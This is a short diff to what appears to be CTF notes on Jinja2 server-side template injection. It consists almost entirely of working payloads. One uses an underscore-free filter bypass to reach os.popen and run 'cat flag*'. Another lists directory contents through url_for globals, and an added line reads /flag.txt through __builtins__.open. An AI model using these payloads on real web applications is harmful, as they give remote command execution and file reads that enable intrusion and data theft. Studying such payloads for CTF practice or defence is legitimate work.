@@ -13,8 +13,9 @@
  #payload without '_' and without '\' 
 {% set c='%c%c'|format(95,95) %}  {{ dict.mro()[-1] | attr(c~'subclasses'~c)() | attr(c~'getitem'~c)(183) |attr(c~'init'~c) | attr(c~'globals'~c) | attr(c~'getitem'~c)('sys') | attr('modules') | attr(c~'getitem'~c)('os') | attr('popen')('cat flag*') | attr('read')() }}
 
- #not sure if it works but i found this.
+ #shortcuts
  {{ url_for.__globals__.os.popen("ls").read() }}
+ {{ self.__init__.__globals__.__builtins__.open("/flag.txt").read() }}
  ```
 
 ![image](https://github.com/user-attachments/assets/d812c5f3-2f59-476a-a1e8-6a7ae978695a)
